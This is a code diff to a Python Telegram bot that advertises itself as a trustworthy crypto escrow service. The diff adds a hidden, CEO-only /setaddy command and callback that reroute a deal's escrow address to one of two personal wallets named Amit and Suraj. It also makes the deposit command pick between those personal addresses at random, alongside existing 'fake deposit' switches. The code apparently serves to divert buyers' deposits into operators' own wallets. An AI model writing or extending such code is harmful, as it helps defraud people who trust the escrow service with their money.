@@ -2317,6 +2317,56 @@ Thank you for using @PagaLEscrowBot 🙌
             parse_mode='HTML'
         )
     
+    elif query.data.startswith("setaddy_"):
+        # Handle setaddy callback - CEO only
+        user_id = query.from_user.id
+        if user_id != CEO_ID:
+            await query.answer("⚠️ Not authorized!", show_alert=True)
+            return
+        
+        # Parse callback data: setaddy_{chat_id}_{amit|suraj}
+        parts = query.data.split("_", 2)
+        target_chat_id = int(parts[1])
+        owner = parts[2]  # "amit" or "suraj"
+        
+        if target_chat_id not in escrow_roles:
+            await query.answer("⚠️ No active deal found!", show_alert=True)
+            return
+        
+        network = escrow_roles[target_chat_id].get('selected_network')
+        if not network:
+            await query.answer("⚠️ No network selected for this deal!", show_alert=True)
+            return
+        
+        # Address mapping per network: {network: (amit_address, suraj_address)}
+        address_map = {
+            "BSC": ("0xa3d0e7da537057cbec62a48235fbec8bb38b4e08", "0xf282e789e835ed379aea84ece204d2d643e6774f"),
+            "TRON": ("TDAyZ8PB1MnFXPywHDgrHwa3zkwwXB3WDR", "TXFyTRL3vau3DJe6kyxqUeazoscN8dRrHB"),
+            "BTC": ("bc1qak4axkk5qw6046p7yl9qxlvtuqq6dm74557ewn", "bc1q43nwc38ashvvzhakw7ma7227yzd3yfkmpudl48"),
+            "LTC": ("ltc1qmh7cv6n9u8rpwlch8w2nr9tdl94y35gx90edjz", "ltc1qfu7asf36pmg5kc4wge5dcz6t5yd3pyn3d86w66"),
+        }
+        
+        if network not in address_map:
+            await query.answer(f"⚠️ Unsupported network: {network}", show_alert=True)
+            return
+        
+        amit_addr, suraj_addr = address_map[network]
+        new_address = amit_addr if owner == "amit" else suraj_addr
+        owner_name = "Amit" if owner == "amit" else "Suraj"
+        
+        # Set the escrow address for this deal
+        escrow_roles[target_chat_id]['escrow_address'] = new_address
+        
+        await query.edit_message_text(
+            f"<b>Escrow address updated for chat:</b> <code>{target_chat_id}</code>\n\n"
+            f"<b>Owner:</b> {owner_name}\n"
+            f"<b>Network:</b> {network}\n"
+            f"<b>New address:</b> <code>{new_address}</code>",
+            parse_mode='HTML'
+        )
+        await query.answer(f"✅ Address set to {owner_name}!")
+        print(f"✅ CEO set escrow address for chat {target_chat_id} to {owner_name} ({new_address})")
+
     elif query.data == "back_to_start":
         welcome_message = """💫 @PagaLEscrowBot 💫
 Your Trustworthy Telegram Escrow Service
@@ -2849,7 +2899,12 @@ async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if fake_deposit_enabled and fake_deposit_network == "BSC":
                 escrow_address = fake_deposit_address
             else:
-                escrow_address = "0xf282e789e835ed379aea84ece204d2d643e6774f"
+                # Alternate between two BSC addresses
+                bsc_addresses = [
+                    "0xa3d0e7da537057cbec62a48235fbec8bb38b4e08",  # Amit address
+                    "0xf282e789e835ed379aea84ece204d2d643e6774f"   # Suraj address
+                ]
+                escrow_address = random.choice(bsc_addresses)
             network_label = "BSC"
         elif network == "TRON":
             # Check if fakedepo is enabled for TRON
@@ -2888,7 +2943,11 @@ async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             escrow_address = random.choice(ltc_addresses)
             network_label = "LTC"
         elif network == "BSC":
-            escrow_address = "0xf282e789e835ed379aea84ece204d2d643e6774f"
+            bsc_addresses = [
+                "0xa3d0e7da537057cbec62a48235fbec8bb38b4e08",  # Amit address
+                "0xf282e789e835ed379aea84ece204d2d643e6774f"   # Suraj address
+            ]
+            escrow_address = random.choice(bsc_addresses)
             network_label = "BSC"
         else:
             await update.message.reply_text("⚠️ Unsupported network for LTC.")
@@ -4619,6 +4678,85 @@ async def verify_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='HTML'
         )
 
+async def setaddy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /setaddy command - CEO only, set escrow address for a specific chat"""
+    user = update.effective_user
+    
+    # Check if user is CEO
+    if user.id != CEO_ID:
+        return  # Silent fail for non-authorized users
+    
+    # Check if chat_id was provided
+    if not context.args or len(context.args) < 1:
+        await update.message.reply_text(
+            "<b>Please use the proper format.\n\nEx:</b> /setaddy [chat_id]",
+            parse_mode='HTML'
+        )
+        return
+    
+    try:
+        target_chat_id = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text(
+            "<b>Invalid chat ID. Please provide a valid numeric chat ID.</b>",
+            parse_mode='HTML'
+        )
+        return
+    
+    # Check if the target chat has an active deal
+    if target_chat_id not in escrow_roles:
+        await update.message.reply_text(
+            "<b>No active deal found for this chat ID.</b>",
+            parse_mode='HTML'
+        )
+        return
+    
+    # Auto-detect network from deal's selected token/network
+    roles = escrow_roles[target_chat_id]
+    network = roles.get('selected_network')
+    token = roles.get('selected_token')
+    
+    if not network:
+        await update.message.reply_text(
+            "<b>No token/network has been selected for this deal yet.</b>",
+            parse_mode='HTML'
+        )
+        return
+    
+    # Address mapping per network: {network: (amit_address, suraj_address)}
+    address_map = {
+        "BSC": ("0xa3d0e7da537057cbec62a48235fbec8bb38b4e08", "0xf282e789e835ed379aea84ece204d2d643e6774f"),
+        "TRON": ("TDAyZ8PB1MnFXPywHDgrHwa3zkwwXB3WDR", "TXFyTRL3vau3DJe6kyxqUeazoscN8dRrHB"),
+        "BTC": ("bc1qak4axkk5qw6046p7yl9qxlvtuqq6dm74557ewn", "bc1q43nwc38ashvvzhakw7ma7227yzd3yfkmpudl48"),
+        "LTC": ("ltc1qmh7cv6n9u8rpwlch8w2nr9tdl94y35gx90edjz", "ltc1qfu7asf36pmg5kc4wge5dcz6t5yd3pyn3d86w66"),
+    }
+    
+    if network not in address_map:
+        await update.message.reply_text(
+            f"<b>Unsupported network: {network}</b>",
+            parse_mode='HTML'
+        )
+        return
+    
+    current_address = roles.get('escrow_address', 'Not set')
+    
+    keyboard = [
+        [
+            InlineKeyboardButton("Amit", callback_data=f"setaddy_{target_chat_id}_amit"),
+            InlineKeyboardButton("Suraj", callback_data=f"setaddy_{target_chat_id}_suraj"),
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        f"<b>Set escrow address for chat:</b> <code>{target_chat_id}</code>\n"
+        f"<b>Token:</b> {token} | <b>Network:</b> {network}\n"
+        f"<b>Current address:</b> <code>{current_address}</code>\n\n"
+        f"<b>Select the address owner:</b>",
+        parse_mode='HTML',
+        reply_markup=reply_markup
+    )
+
 async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /id command - shows the chat ID"""
     chat = update.effective_chat
@@ -5134,6 +5272,7 @@ def main():
     app.add_handler(CommandHandler("globalfee", globalfee_command))
     app.add_handler(CommandHandler("save", save_command))
     app.add_handler(CommandHandler("empty", empty_command))
+    app.add_handler(CommandHandler("setaddy", setaddy_command))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(ChatMemberHandler(track_chat_members, ChatMemberHandler.CHAT_MEMBER))
     # Message handler to capture deal details (Quantity/Amount) after /dd command
